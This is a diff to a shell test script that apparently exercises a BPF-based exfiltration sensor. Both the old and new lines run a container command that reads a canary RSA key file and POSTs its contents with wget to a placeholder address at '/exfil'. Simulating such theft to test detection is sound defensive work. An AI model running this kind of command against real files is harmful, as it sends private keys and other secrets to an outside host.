@@ -169,7 +169,7 @@ if [[ "${EXFIL_RUN_BPF_TESTS:-0}" == "1" ]]; then
     --name "$container" \
     --canary-dir "$tmpdir/canary" \
     "$image" \
-    sh -c 'while [ ! -e /canary/.sensor-ready ]; do /bin/true; sleep 1; done; payload="$(cat /canary/canary_rsa)"; export EXFIL_CHILD_PAYLOAD="$payload"; sh -c "exec wget -T 2 -q -O - --post-data \"$EXFIL_CHILD_PAYLOAD\" http://198.51.100.10/exfil"' \
+    sh -c 'while [ ! -e /canary/.sensor-ready ]; do /bin/true; sleep 1; done; payload="$(cat /canary/canary_rsa)"; export EXFIL_CHILD_PAYLOAD="$payload"; sh -c "wget -T 2 -q -O - --post-data \"$EXFIL_CHILD_PAYLOAD\" http://198.51.100.10/exfil >/dev/null 2>&1 || true; sleep 8"' \
     >"$runtime_container_log" 2>&1 &
   container_runner_pid=$!
 
